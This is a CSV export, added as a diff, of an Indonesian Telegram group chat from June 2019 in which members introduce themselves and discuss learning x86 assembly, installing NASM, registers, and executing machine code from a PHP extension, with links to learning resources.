@@ -1,0 +1,1648 @@
+id,reply_to_msg_id,text,day_utc,month_utc,year_utc,hour_utc,minute_utc,second_utc,first_name,last_name,phone,username
+1,0,,26,6,2019,9,10,55,,,0,
+3,0,,26,6,2019,9,19,23,Ammar Faizi,,0,ammarfaizi2
+4,0,,26,6,2019,9,23,59,⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠,GNU/std::sakty ( ✪ ),0,sunda005
+6,0,,26,6,2019,9,28,32,ㅤ,,0,
+7,0,,26,6,2019,9,28,38,Hei,,0,phyxkal
+8,0,,26,6,2019,9,28,42,Idh@m,Damra Muktar,0,
+9,0,,26,6,2019,9,28,58,🐾 Angga,,0,AnggaWolf
+11,0,,26,6,2019,9,30,28,Muhammad,Al Fatih,0,Jovanzers
+12,0,,26,6,2019,9,30,38,Eunbi,,0,rainysm
+13,0,,26,6,2019,9,32,55,☈in ✶,,0,ri7nz
+14,0,,26,6,2019,9,33,22,>> 𝗩𝗶𝗿,•,0,vir_sam
+15,0,,26,6,2019,9,34,12,Shinji,Ikari,0,gh0zialfat1h
+17,0,,26,6,2019,9,41,52,,,0,
+18,0,,26,6,2019,9,42,49,Mikhael,Permanto,0,mikhaelpermanto
+19,0,,26,6,2019,9,50,4,Alif,,0,alif_dev
+20,0,,26,6,2019,9,51,50,Moe,,0,moepoi
+21,0,,26,6,2019,9,55,26,Irvan,Putra,0,irvansemestanya
+22,0,,26,6,2019,10,12,48,Said Humar,Basri,0,humarbasri
+23,0,,26,6,2019,10,25,54,Tristan,,0,trisbman
+24,0,,26,6,2019,10,27,52,Risman,,0,rsmnarts
+25,0,,26,6,2019,11,0,57,Yudi,Andela,0,yudi_andela
+26,0,,26,6,2019,11,42,59,Egii,,0,eegsyy
+28,0,,26,6,2019,12,30,58,,,0,
+29,0,😀,26,6,2019,12,31,48,ㅤ,,0,
+30,0,,26,6,2019,12,32,5,,,0,
+33,0,,26,6,2019,13,17,35,Nugraha,,0,LoliOverflow
+34,0,,26,6,2019,13,18,0,Risman,,0,rsmnarts
+36,0,👌🏻,26,6,2019,13,18,58,Nugraha,,0,LoliOverflow
+37,0,,26,6,2019,13,31,39,,,0,
+38,0,,26,6,2019,14,22,2,,,0,
+39,0,Halo halo,26,6,2019,14,37,54,>> 𝗩𝗶𝗿,•,0,vir_sam
+40,0,nemu\nhttps://pastebin.com/NNm86fQf,26,6,2019,15,3,33,Adib,,0,dibexe
+41,0,,26,6,2019,15,16,26,Aldhi,,0,aldhinya
+42,0,,26,6,2019,15,25,25,Jel,,0,zelsaddr
+43,0,,26,6,2019,16,55,56,Randi,Alwi,0,RandiAlwi
+44,0,Ada yang punya sesuatu untuk dibahas?,26,6,2019,16,59,30,Ammar Faizi,,0,ammarfaizi2
+45,0,"Getting started, maybe?",26,6,2019,17,10,40,Nugraha,,0,LoliOverflow
+46,0,Getting started untuk Assembly mungkin bisa dimulai dari pengenalan dulu.,26,6,2019,17,24,0,Ammar Faizi,,0,ammarfaizi2
+47,0,"> Bahasa Assembly ini bisa disebut sebagai representasi dari instruksi processor.\n> Dia adalah low level language.\n> Assembly tidak portable, instruksinya beda-beda tiap jenis processor.\n> Kaidah penulisannya gak humanis, susah dipahami manusia.",26,6,2019,17,26,27,Ammar Faizi,,0,ammarfaizi2
+48,0,,26,6,2019,17,26,53,,,0,
+49,0,"Untuk mulai bahas codingnya mungkin bisa kita mulai dari CPU x86/x64 dulu ya, yang sering kepakai.",26,6,2019,17,29,6,Ammar Faizi,,0,ammarfaizi2
+50,44,Assembly for image processing 😁,26,6,2019,17,29,17,Yovi,Prasetyo,0,yoviprasetyo
+51,49,"Selain CPU x86/x64 ada processor jenis apalagi, Pak @ammarfaizi2 ?",26,6,2019,17,29,53,Yovi,Prasetyo,0,yoviprasetyo
+52,50,Ada pengantar topiknya?,26,6,2019,17,31,18,Ammar Faizi,,0,ammarfaizi2
+53,51,"ARM, AVR, PowerPC, dsb.",26,6,2019,17,31,44,Ammar Faizi,,0,ammarfaizi2
+54,52,Image Similarity. Mengukur derajat kesamaan dua gambar.,26,6,2019,17,32,25,Yovi,Prasetyo,0,yoviprasetyo
+55,0,😁,26,6,2019,17,32,30,Yovi,Prasetyo,0,yoviprasetyo
+56,54,Cara kerjanya gimana tuh pak?,26,6,2019,17,33,9,Ammar Faizi,,0,ammarfaizi2
+57,0,"Habis nyoba googling, nemu old repo bahas image processing juga.\n\nhttps://github.com/cngzhnp/SPProject1",26,6,2019,17,34,46,Ammar Faizi,,0,ammarfaizi2
+58,49,Utk OS ngga terpengaruh berarti ya,26,6,2019,17,34,56,Nugraha,,0,LoliOverflow
+59,58,Untuk register dan instruction gak pengaruh.,26,6,2019,17,35,43,Ammar Faizi,,0,ammarfaizi2
+60,56,"Saya gak tau, Pak. Hehe. Bingung juga cari2.",26,6,2019,17,36,16,Yovi,Prasetyo,0,yoviprasetyo
+61,57,Wew. Mantap.,26,6,2019,17,36,44,Yovi,Prasetyo,0,yoviprasetyo
+62,58,Syscall-nya aja yang beda palingan.,26,6,2019,17,36,46,,,0,
+63,0,Let's start with a question.\nWhy should we code in Assembly?\nAren't there so many human readable programming languages which are easier to learn than Assembly?,26,6,2019,17,40,43,,,0,
+64,63,"Yang kepikiran...\n\n1. Assembly itu cepat, bisa lebih cepat dari C. (Karena hasil compilenya C masih ada frame lagi di atas libc, otomatis instruction lebih banyak).\n\n2. Banyak hal yang bisa dilakukan oleh Assembly tapi hal tersebut gak bisa dilakukan di bahasa lain.\n\n3. Buat reverse engineering.\n\nAda yang mau nambahin?",26,6,2019,17,46,19,Ammar Faizi,,0,ammarfaizi2
+65,64,"Point 2, kurasa tidak dengan C.",26,6,2019,18,0,12,,,0,
+66,0,Kan ada assembler juga,26,6,2019,18,0,23,,,0,
+67,66,Kodingan assembler = ngoding Assembly juga kali.,26,6,2019,18,1,17,Ammar Faizi,,0,ammarfaizi2
+68,67,Oh right,26,6,2019,18,1,35,,,0,
+69,0,,27,6,2019,0,10,50,Aaron,,0,ExploreOurBrain
+70,0,,27,6,2019,5,24,14,♾,,0,rioneff000
+71,0,,27,6,2019,6,58,0,Supian,M,0,SupianIDz
+72,0,,27,6,2019,8,18,11,Zul,Fachri,0,Zee1945
+73,0,,27,6,2019,9,31,19,Gandi,S,0,setsuga
+74,0,Salaman kenal,27,6,2019,9,32,12,Gandi,S,0,setsuga
+75,0,,27,6,2019,10,9,18,Iyan,Jiban,0,Iyanjiban
+76,0,,27,6,2019,14,3,58,,,0,
+77,0,Halo Om. Salken,27,6,2019,14,4,10,,,0,
+78,0,,27,6,2019,14,11,17,bhrdn,,0,me_bhrdn
+79,0,Salam kenal,27,6,2019,14,20,0,Ammar Faizi,,0,ammarfaizi2
+80,0,Salken om,27,6,2019,14,20,18,>> 𝗩𝗶𝗿,•,0,vir_sam
+81,0,"Om @ammarfaizi2 mau tanya, untuk memulai pemrograman assembly, apakah harus install software khusus?, makasih",27,6,2019,14,21,50,>> 𝗩𝗶𝗿,•,0,vir_sam
+82,81,Install Assembler dulu pak.,27,6,2019,14,22,58,Ammar Faizi,,0,ammarfaizi2
+83,0,Kalau untuk yang x86 pakainya NASM.,27,6,2019,14,23,7,Ammar Faizi,,0,ammarfaizi2
+84,0,Itu untuk windows om?,27,6,2019,14,23,21,>> 𝗩𝗶𝗿,•,0,vir_sam
+85,0,"Udah support 16-bit, 32-bit, 64-bit dalam 1 compiler.",27,6,2019,14,23,25,Ammar Faizi,,0,ammarfaizi2
+86,84,Windows bisa juga kayaknya.,27,6,2019,14,23,43,Ammar Faizi,,0,ammarfaizi2
+87,0,Saya belum pernah coba install NASM yang Windows.,27,6,2019,14,24,1,Ammar Faizi,,0,ammarfaizi2
+88,0,Kalau di Ubuntu tinggal `sudo apt install nasm`,27,6,2019,14,24,16,Ammar Faizi,,0,ammarfaizi2
+89,0,Iya om,27,6,2019,14,24,33,>> 𝗩𝗶𝗿,•,0,vir_sam
+90,0,Oke makasih om,27,6,2019,14,24,41,>> 𝗩𝗶𝗿,•,0,vir_sam
+91,0,"Mana yang lebih susah, bahasa assembly atau bahasa mesin?",27,6,2019,14,26,38,Alif,,0,alif_dev
+92,91,"Bahasa mesin langsung lebih susah pastinya pak, gak mungkin kan orang baca raw machine code. Kalau Assembly ini representasi raw machine code yang bisa dibaca manusia.",27,6,2019,14,28,59,Ammar Faizi,,0,ammarfaizi2
+93,0,"Tapi seandainya kita coba, apakah mungkin kita bisa ngoding langsung pake bahasa mesin?",27,6,2019,14,30,0,Alif,,0,alif_dev
+94,93,Bisa saja,27,6,2019,14,31,27,Ammar Faizi,,0,ammarfaizi2
+95,0,Tapi jelas gak efektif.,27,6,2019,14,31,49,Ammar Faizi,,0,ammarfaizi2
+96,0,"Machine code banyakan unprintable, masa mau ngoding aplikasi pakai hexeditor.",27,6,2019,14,32,15,Ammar Faizi,,0,ammarfaizi2
+97,0,Gunanya compiler buat apa?,27,6,2019,14,32,25,Ammar Faizi,,0,ammarfaizi2
+98,0,"Om, Maaf nih saya nanya. saya kan masih pemula .",27,6,2019,14,36,53,,,0,
+99,0,,27,6,2019,14,37,1,,,0,
+100,0,itu memang untuk Mobile Version ya om ?,27,6,2019,14,37,6,,,0,
+101,83,Ini di window apa linux pak,27,6,2019,14,38,6,Gandi,S,0,setsuga
+102,99,"Kurang tau, saya belum pernah nyoba Assembler di Android.",27,6,2019,14,40,10,Ammar Faizi,,0,ammarfaizi2
+103,101,Ada yang buat Windows pak,27,6,2019,14,40,23,Ammar Faizi,,0,ammarfaizi2
+104,0,http://osprey.unisa.ac.za/download/Disk/Disk%202016/install/nasm/nasmsetup.exe,27,6,2019,14,40,25,Ammar Faizi,,0,ammarfaizi2
+105,102,Bukanya intruksinya beda juga,27,6,2019,14,40,32,,,0,
+106,105,Harusnya sih.,27,6,2019,14,40,46,Ammar Faizi,,0,ammarfaizi2
+107,0,Android rata-rata ARMv*.,27,6,2019,14,40,53,Ammar Faizi,,0,ammarfaizi2
+108,0,Pen belajar lewat android cuma...,27,6,2019,14,41,12,,,0,
+109,0,Ya itu beda pasti,27,6,2019,14,41,20,,,0,
+110,0,"Baca dulu deh, mengumpulkan niat dulu",27,6,2019,14,41,34,,,0,
+111,0,"Pakai SSH, connect ke server x86",27,6,2019,14,41,35,Ammar Faizi,,0,ammarfaizi2
+112,0,leppy Ku udh rusak Om 😅,27,6,2019,14,41,42,,,0,
+113,0,mkanya  mau coba dari andro,27,6,2019,14,41,52,,,0,
+114,110,Ok om,27,6,2019,14,42,12,,,0,
+115,0,https://www.youtube.com/watch?v=VQAKkuLL31g&list=PLetF-YjXm-sCH6FrTz4AQhfH6INDQvQSn,27,6,2019,14,58,50,Ammar Faizi,,0,ammarfaizi2
+116,0,https://archive.teainside.org/fcs/Art%20Of%20Intel%20x86%20Assembly.pdf,27,6,2019,15,25,18,Ammar Faizi,,0,ammarfaizi2
+117,116,,27,6,2019,15,25,23,Ammar Faizi,,0,ammarfaizi2
+118,0,,27,6,2019,19,3,35,Richie,Permana,0,permanar
+121,0,,28,6,2019,1,45,36,loncat,,0,p4kl0nc4t
+122,0,,28,6,2019,3,5,29,Moriah,Soewako,0,soewako
+123,0,,28,6,2019,3,5,35,Moriah,Soewako,0,soewako
+124,109,"Gpp om, belajar Arm terus ajarin kita-kita di sini ☺️",28,6,2019,3,6,2,Moriah,Soewako,0,soewako
+125,0,Hae gaes,28,6,2019,4,3,0,loncat,,0,p4kl0nc4t
+126,0,Hæ,28,6,2019,6,21,35,Moriah,Soewako,0,soewako
+127,0,,28,6,2019,10,14,48,Uzan,kbu,0,Csoyy
+128,0,,28,6,2019,11,32,5,,,0,
+130,0,,29,6,2019,3,23,46,hadi,wijaya,0,Xn1nj4
+131,44,"1.share ebook foundamental om, 2.assembly cocoknya digunain di kasus seperti apa?\n3.bootloader maybe\n4.bagaimana berinteraksi dengan hardware (mungkin bisa mulai dari embeded) seperti arduino",29,6,2019,3,31,44,hadi,wijaya,0,Xn1nj4
+132,131,"Untuk ebook fundamental tentang Assembly, kita belum punya sih.",29,6,2019,6,8,4,Ammar Faizi,,0,ammarfaizi2
+133,0,"Saya lagi nyoba bikin, tapi belum selesai.",29,6,2019,6,8,14,Ammar Faizi,,0,ammarfaizi2
+134,0,,29,6,2019,6,8,34,Ammar Faizi,,0,ammarfaizi2
+135,0,Ntar kalau udah selesai saya share kemari.,29,6,2019,6,8,43,Ammar Faizi,,0,ammarfaizi2
+136,133,"semoga cepet selesai kang, siap menunggu",29,6,2019,6,9,33,hadi,wijaya,0,Xn1nj4
+137,134,mantab ini,29,6,2019,6,10,9,hadi,wijaya,0,Xn1nj4
+138,0,,29,6,2019,6,10,48,詹,鉦華,0,jzh4n
+139,131,"Untuk point 2, sejauh ini yang paling berguna untuk saya di production buat API. Dulu dapet kerjaan bikin endpoint yang nerima payload machine code x86_64. Eksekusinya lumayan simple, cuma yang rumit mapping memory-nya.",29,6,2019,6,11,15,Ammar Faizi,,0,ammarfaizi2
+140,0,Reponya masih ada https://github.com/ammarfaizi2/PhpNasm,29,6,2019,6,11,26,Ammar Faizi,,0,ammarfaizi2
+141,0,Untuk bootloader dan embedded system saya belum pernah nyentuh. Cuma handle x86 doang sejauh ini.,29,6,2019,6,12,36,Ammar Faizi,,0,ammarfaizi2
+142,0,Sama ARM dikit lah.,29,6,2019,6,12,52,Ammar Faizi,,0,ammarfaizi2
+143,140,noted,29,6,2019,6,13,27,hadi,wijaya,0,Xn1nj4
+144,0,"btw sebelumnya, salam kenal. saya hadi dari lombok",29,6,2019,6,13,45,hadi,wijaya,0,Xn1nj4
+145,0,Salam kenal,29,6,2019,6,13,58,Ammar Faizi,,0,ammarfaizi2
+147,0,"Saya Ammar F, dari Jakarta.",29,6,2019,6,14,8,Ammar Faizi,,0,ammarfaizi2
+148,0,Salam kenal,29,6,2019,6,14,45,詹,鉦華,0,jzh4n
+149,148,battosai 😁,29,6,2019,6,15,0,hadi,wijaya,0,Xn1nj4
+150,131,"Yang no. 4 sih, jaman aku mainan AVR dulu, itu biasanya perangkat eksternal-nya disambungin ke port tertentu di CPU, terus kirim request & baca response pakai perintah outb/inb 🤔",29,6,2019,6,15,26,Moriah,Soewako,0,soewako
+151,0,"Nyubi bertanya, ada yang punya tutorial MASM?",29,6,2019,6,15,27,詹,鉦華,0,jzh4n
+152,150,"Kurang lebihnya mirip-mirip kaya API berbasis HTTP lah, tapi satu-satunya tipe data yang kita punya ya byte",29,6,2019,6,16,41,Moriah,Soewako,0,soewako
+153,150,si ASM request ke CPU yah?,29,6,2019,6,16,48,hadi,wijaya,0,Xn1nj4
+154,153,ASM request ke hardware-nya\nNanti hardware bakal kasih response yang bisa dibaca lewat ASM,29,6,2019,6,17,23,Moriah,Soewako,0,soewako
+155,152,wah saya masih awam nih di ASM,29,6,2019,6,17,27,hadi,wijaya,0,Xn1nj4
+156,151,Belum punya,29,6,2019,6,18,6,Ammar Faizi,,0,ammarfaizi2
+157,0,mungkin ada refrensi web atau ebook recommended untuk dibaca pemula?,29,6,2019,6,18,43,hadi,wijaya,0,Xn1nj4
+158,156,,29,6,2019,6,19,9,詹,鉦華,0,jzh4n
+159,116,Yg ini coba,29,6,2019,6,19,30,Alif,,0,alif_dev
+160,159,siap,29,6,2019,6,19,44,hadi,wijaya,0,Xn1nj4
+161,157,Yang di pinned message gimana om?,29,6,2019,6,20,18,Moriah,Soewako,0,soewako
+162,161,"sudah saya download barusan, belum sempat dibaca",29,6,2019,6,21,47,hadi,wijaya,0,Xn1nj4
+163,0,sepertinya lengkap sekali,29,6,2019,6,21,55,hadi,wijaya,0,Xn1nj4
+164,0,seribuan lebih halaman,29,6,2019,6,22,2,hadi,wijaya,0,Xn1nj4
+165,0,selesai bacanya berapa minggu ya? haha,29,6,2019,6,22,21,hadi,wijaya,0,Xn1nj4
+166,0,usul om bikin video tutorial ASM,29,6,2019,6,22,37,hadi,wijaya,0,Xn1nj4
+167,0,ASM best practice,29,6,2019,6,23,9,hadi,wijaya,0,Xn1nj4
+168,165,"Berapa bulan palingan, saya sendiri juga belum selesai semua wkwkwk.",29,6,2019,6,23,27,Ammar Faizi,,0,ammarfaizi2
+169,168,wakaka,29,6,2019,6,23,36,hadi,wijaya,0,Xn1nj4
+170,0,"asumsi saya sebagai orang awam di ASM, belajar ASM itu erat kaitannya dengan hardware",29,6,2019,6,24,25,hadi,wijaya,0,Xn1nj4
+171,168,"BTW, bab itungan di awal banyak yang kepake ga?",29,6,2019,6,24,50,,,0,
+172,0,"Kalau sebagai pengetahuan, jelas",29,6,2019,6,25,3,,,0,
+173,0,"mungkin lebih gampang penjelasannya di embeded, menurut saya CMIIW",29,6,2019,6,25,6,hadi,wijaya,0,Xn1nj4
+174,173,Bukanya arsitektur proci jaman sekarang dah ribet?,29,6,2019,6,25,55,,,0,
+175,0,8086 iya jelas lebih simpel,29,6,2019,6,26,1,,,0,
+176,0,"bikin video tutorial, bagaimana  langkah2 burn ASM ke chip",29,6,2019,6,26,18,hadi,wijaya,0,Xn1nj4
+177,174,nah perlu pencerahan di sini biar ga tersesat 😊,29,6,2019,6,27,4,hadi,wijaya,0,Xn1nj4
+178,167,"Hindari nulis ASM kecuali mau akses daleman prosesor (vector/crypto/hardware ports/interrupt/...). Kalau soal kecepatan, biasanya compiler biasa bisa bikin ASM yang jauh lebih cepat dari ASM tulisan sendiri",29,6,2019,6,27,18,Moriah,Soewako,0,soewako
+179,0,*kabursebelumdimarahinAmmar,29,6,2019,6,27,25,Moriah,Soewako,0,soewako
+180,0,,29,6,2019,6,27,29,Moriah,Soewako,0,soewako
+181,178,Driver including kan?,29,6,2019,6,27,54,,,0,
+182,181,Tentu,29,6,2019,6,28,4,Moriah,Soewako,0,soewako
+183,0,Bikin driver 'kan pasti ngobok-obok daleman hardware,29,6,2019,6,28,15,Moriah,Soewako,0,soewako
+184,178,ini menarik,29,6,2019,6,28,25,hadi,wijaya,0,Xn1nj4
+185,179,Pasti dia nyaranin untuk semua,29,6,2019,6,28,40,,,0,
+186,174,Kalau mainnya cuma di usermode sih simpel harusnya 🤔,29,6,2019,6,29,0,Moriah,Soewako,0,soewako
+187,183,si om sukanya daleman... peace,29,6,2019,6,29,5,hadi,wijaya,0,Xn1nj4
+188,171,"Kalau di ane sendiri jarang kepakai pak, ngitung-ngitung kayak gitu biasanya pake Python/PHP, convert ke dec. Atau kalau lagi debugging di gdb pake `p/d`.",29,6,2019,6,29,26,Ammar Faizi,,0,ammarfaizi2
+189,186,Tapi buat apa kalau mainya disono?,29,6,2019,6,29,34,,,0,
+190,188,"Oke, kayaknya buat sambilan ane nganu py juga",29,6,2019,6,29,52,,,0,
+191,189,Latihan?,29,6,2019,6,29,53,Moriah,Soewako,0,soewako
+192,191,Bener juga sih,29,6,2019,6,30,0,,,0,
+193,0,Asm kan buat ngakses yang dalem,29,6,2019,6,30,40,,,0,
+194,0,Terus yang macam vector/crypto/whatever processor 'kan bisa diakses dari user mode juga,29,6,2019,6,30,50,Moriah,Soewako,0,soewako
+195,179,"Loh nggak, jangan ngoding ASM seutuhnya juga. Contoh mau nampilin hello world 1000 kali, kalau pakai printf-nya C dibanding direct syscallnya ASM pasti C lebih unggul. Karena C pake buffer, ASM gak ada buffer. Otomatis overhead kebanyakan syscall di ASM.",29,6,2019,6,32,50,Ammar Faizi,,0,ammarfaizi2
+196,0,Best practicenya bikin mekanisme yang mirip buffernya C di ASM.,29,6,2019,6,33,24,Ammar Faizi,,0,ammarfaizi2
+197,0,"usul, bahasan di sini lebih ke hardware control aja gmn?",29,6,2019,6,33,43,hadi,wijaya,0,Xn1nj4
+198,197,Contohnya?,29,6,2019,6,34,29,Ammar Faizi,,0,ammarfaizi2
+199,0,"contohnya AVR, atau arduino yang sekarang",29,6,2019,6,36,25,hadi,wijaya,0,Xn1nj4
+200,0,"gmn sih prinsip dasarnya, kok bisa ngendaliin pin dari arduino?",29,6,2019,6,36,50,hadi,wijaya,0,Xn1nj4
+201,0,Arduino bukanya dah bagus ya di akses lewat c?,29,6,2019,6,36,52,,,0,
+202,200,Ini,29,6,2019,6,37,2,,,0,
+203,201,"iya bang, ga ada salahnya pengenalan pake ASM",29,6,2019,6,37,23,hadi,wijaya,0,Xn1nj4
+204,0,biar tau dasarnya,29,6,2019,6,37,29,hadi,wijaya,0,Xn1nj4
+205,0,kok bisa sih chip atmega itu komunikasi via serial? dan sebagainya,29,6,2019,6,38,23,hadi,wijaya,0,Xn1nj4
+206,0,,29,6,2019,6,39,52,hadi,wijaya,0,Xn1nj4
+207,205,Saya belum ada pengalaman ke situ. Kita tunggu member lain kalau ada yang mau bikin pengantar topiknya hehe.,29,6,2019,6,41,32,Ammar Faizi,,0,ammarfaizi2
+208,207,"selama ini, make ASM untuk keperluan apa om?",29,6,2019,6,42,13,hadi,wijaya,0,Xn1nj4
+209,208,"Saya sering pakai buat handle backend server pak, di tempat saya kodingan C-nya banyak dicampur dengan Assembler.",29,6,2019,6,44,22,Ammar Faizi,,0,ammarfaizi2
+210,0,Cuma x86/x64 aja yang saya tau.,29,6,2019,6,44,37,Ammar Faizi,,0,ammarfaizi2
+211,209,Kenapa dicampur asm btw?,29,6,2019,6,44,58,Moriah,Soewako,0,soewako
+212,209,contohnya seperti apa?,29,6,2019,6,45,12,hadi,wijaya,0,Xn1nj4
+213,211,Karena ada beberapa hal yang gak memungkinkan ditulis pake C.,29,6,2019,6,45,39,Ammar Faizi,,0,ammarfaizi2
+214,212,"Contoh di sini ada riyuu socket, dia transaksi data dari client ke server pakai struct, di dalem structnya ada address X, nanti server eksekusi address X sebagai callback, passing parameter ke callback-nya gak bisa ditulis pake C, harus setup stack frame sendiri.",29,6,2019,6,47,16,Ammar Faizi,,0,ammarfaizi2
+215,0,"biar ada gambaran bagi awam seperti saya, ASM itu dipake untuk apa saja dan kenapa harus menggunaoan ASM, seperti pernyataan di atas bahwa tidak memungkinkan menggunakan C",29,6,2019,6,47,44,hadi,wijaya,0,Xn1nj4
+216,214,noted,29,6,2019,6,48,38,hadi,wijaya,0,Xn1nj4
+217,214,asm buat jembatan toh,29,6,2019,6,48,39,,,0,
+218,140,"Ini juga sama, mau passing value-nya PHP gak bisa ditulis pakai C. Gak mungkin kan include stdarg lewat payload.",29,6,2019,6,48,44,Ammar Faizi,,0,ammarfaizi2
+219,217,Salah satunya itu.,29,6,2019,6,49,32,Ammar Faizi,,0,ammarfaizi2
+220,218,Edited *,29,6,2019,6,50,35,Ammar Faizi,,0,ammarfaizi2
+221,0,Contoh codenya gini,29,6,2019,6,54,18,Ammar Faizi,,0,ammarfaizi2
+222,131,,29,6,2019,6,56,11,Iyan,Jiban,0,Iyanjiban
+223,0,"Baris 57, variable map itu mapped memory yang executable.\nKita kan gak punya T_SPLAT_OPERATOR kayak di PHP, jadi di situ push ke stack, ambil address puncak stacknya, habis itu simpen addressnya ke register rdi (jadi parameter pertama).",29,6,2019,6,56,34,Ammar Faizi,,0,ammarfaizi2
+224,0,Itu parameter dapetnya dari `Z_PARAM_VARIADIC`. Buat ngambil parameter dengan jumlah yang dinamis dari PHP.,29,6,2019,6,58,24,Ammar Faizi,,0,ammarfaizi2
+225,170,,29,6,2019,7,0,6,Iyan,Jiban,0,Iyanjiban
+226,223,sepertinya saya butuh kopi untuk memahami ini 😁,29,6,2019,7,1,51,hadi,wijaya,0,Xn1nj4
+227,0,ngacir belajar syntax dasar ASM dulu,29,6,2019,7,2,53,hadi,wijaya,0,Xn1nj4
+228,0,gk paham apa2\nassembly itu bahasa nya apa?,29,6,2019,7,3,15,Uzan,kbu,0,Csoyy
+229,0,Ada yg pernah buat .asm dgn dosbox?,29,6,2019,7,3,59,Iyan,Jiban,0,Iyanjiban
+230,226,"Emang rada susah jelasin ASM, gak kayak HLL \/",29,6,2019,7,8,59,Ammar Faizi,,0,ammarfaizi2
+231,228,Maksudnya gimana pak?,29,6,2019,7,9,16,Ammar Faizi,,0,ammarfaizi2
+232,229,Belum,29,6,2019,7,9,56,Ammar Faizi,,0,ammarfaizi2
+233,0,Dan fungsi .mov itu ngecek memory yg berjalan ? Atau mencetak sebuat karakter ya?,29,6,2019,7,10,45,Iyan,Jiban,0,Iyanjiban
+234,233,Note newvie :3,29,6,2019,7,11,3,Iyan,Jiban,0,Iyanjiban
+235,233,Ini bahas instruction mov di x86?,29,6,2019,7,11,27,Ammar Faizi,,0,ammarfaizi2
+236,227,Gk cpek di lombok ngopinya om :3,29,6,2019,7,11,31,Iyan,Jiban,0,Iyanjiban
+237,235,Yup sensei,29,6,2019,7,12,1,Iyan,Jiban,0,Iyanjiban
+238,0,"Bukan mencetak/ngecek sih, tapi mirip assigment.",29,6,2019,7,12,19,Ammar Faizi,,0,ammarfaizi2
+239,0,"mov rax, 1",29,6,2019,7,12,22,Ammar Faizi,,0,ammarfaizi2
+240,236,kenapa gitu? 😁,29,6,2019,7,12,24,hadi,wijaya,0,Xn1nj4
+241,239,Nilai rax jadi 1,29,6,2019,7,12,29,Ammar Faizi,,0,ammarfaizi2
+242,0,Kalau versi HLL-nya.\n\nrax = 1,29,6,2019,7,12,45,Ammar Faizi,,0,ammarfaizi2
+243,0,mov itu singkatan dari move bukan?,29,6,2019,7,13,13,hadi,wijaya,0,Xn1nj4
+244,243,Iya,29,6,2019,7,13,28,Ammar Faizi,,0,ammarfaizi2
+245,244,IC,29,6,2019,7,13,48,hadi,wijaya,0,Xn1nj4
+246,0,,29,6,2019,7,17,49,Ammar Faizi,,0,ammarfaizi2
+247,0,"Saya coba sharing dikit cara pakainya, mumpung lagi libur.",29,6,2019,7,17,50,Ammar Faizi,,0,ammarfaizi2
+248,236,arrayyan sumbawa bukan? 😁,29,6,2019,7,17,53,hadi,wijaya,0,Xn1nj4
+249,0,,29,6,2019,7,18,34,Ammar Faizi,,0,ammarfaizi2
+250,246,"Di sini saya passing parameter $a, isinya ""Hello World 123"", nah saya mau nyoba edit valuenya jad ""Hello World 321"" pakai payload x86_64.",29,6,2019,7,19,19,Ammar Faizi,,0,ammarfaizi2
+251,246,assembly bisa digabung semua bahasa program kah?,29,6,2019,7,19,39,Uzan,kbu,0,Csoyy
+252,249,"Di sini variable arg_val nanti nyimpen addressnya si ""Hello World 123"". Jadi dia di-push ke dalam stack, setelah itu di baris 55 ambil address puncak stacknya, taruh ke register RDI (otomatis jadi parameter 1).",29,6,2019,7,20,58,Ammar Faizi,,0,ammarfaizi2
+253,251,"Literally, bisa.",29,6,2019,7,21,10,Ammar Faizi,,0,ammarfaizi2
+254,252,RDI itu apa om?,29,6,2019,7,21,51,hadi,wijaya,0,Xn1nj4
+255,0,harus banyak baca lagi nih biar bisa ngikutin materi di sini,29,6,2019,7,22,40,hadi,wijaya,0,Xn1nj4
+256,0,semoga ebooknya segera rampung om,29,6,2019,7,23,6,hadi,wijaya,0,Xn1nj4
+257,254,RDI itu salah satu register di processor x86_64. Standardnya ABI-nya dipakai buat nampung parameter pertama yang dipassing ke sebuah subroutine.,29,6,2019,7,23,36,Ammar Faizi,,0,ammarfaizi2
+258,0,"ada e-book yg bahasa indonesianya kah?,masih usaha belajar bhs inggris",29,6,2019,7,23,43,Uzan,kbu,0,Csoyy
+259,254,Data source index om,29,6,2019,7,24,5,Iyan,Jiban,0,Iyanjiban
+260,246,Wait wait\nIni jadinya ada file php yang dapat parameter kode x86 dari luar gitu?,29,6,2019,7,24,16,Moriah,Soewako,0,soewako
+261,260,Betul,29,6,2019,7,24,38,Ammar Faizi,,0,ammarfaizi2
+262,259,,29,6,2019,7,24,39,hadi,wijaya,0,Xn1nj4
+263,248,Wkwkwkw,29,6,2019,7,24,41,Iyan,Jiban,0,Iyanjiban
+264,263,bener ga nih si rayen?,29,6,2019,7,25,16,hadi,wijaya,0,Xn1nj4
+265,261,Kenapa mesti gitu? Memang spek dari sananya kah?,29,6,2019,7,25,31,Moriah,Soewako,0,soewako
+266,265,"Iya, memang ada hookshot yang nembak payload x86_64.",29,6,2019,7,25,57,Ammar Faizi,,0,ammarfaizi2
+267,0,Kita lanjut dulu,29,6,2019,7,26,9,Ammar Faizi,,0,ammarfaizi2
+268,249,Ane udah pasang breakpoint di line 55,29,6,2019,7,26,18,Ammar Faizi,,0,ammarfaizi2
+269,266,Whew okee,29,6,2019,7,26,21,Moriah,Soewako,0,soewako
+270,0,,29,6,2019,7,26,49,Ammar Faizi,,0,ammarfaizi2
+271,270,Perhatikan nilai $rsp.,29,6,2019,7,27,27,Ammar Faizi,,0,ammarfaizi2
+272,0,"Dia ngarah ke `0x00007ffff3001780`.\nItulah address yang ngehold data ""Hello World 123"".",29,6,2019,7,27,59,Ammar Faizi,,0,ammarfaizi2
+273,0,,29,6,2019,7,28,22,Ammar Faizi,,0,ammarfaizi2
+274,0,Bisa kita lihat pakai hexdump byte di sini.,29,6,2019,7,28,34,Ammar Faizi,,0,ammarfaizi2
+275,0,"Karena di PHP data string itu disimpan dalam struct zend_string, maka kita perlu tau strukturnya dulu biar bisa pas ukuranya ketika ngedit data.",29,6,2019,7,29,24,Ammar Faizi,,0,ammarfaizi2
+276,0,"/me bentar, mau corat-coret dulu pakai GIMP, biar clear.",29,6,2019,7,30,2,Ammar Faizi,,0,ammarfaizi2
+277,0,,29,6,2019,7,33,27,Ammar Faizi,,0,ammarfaizi2
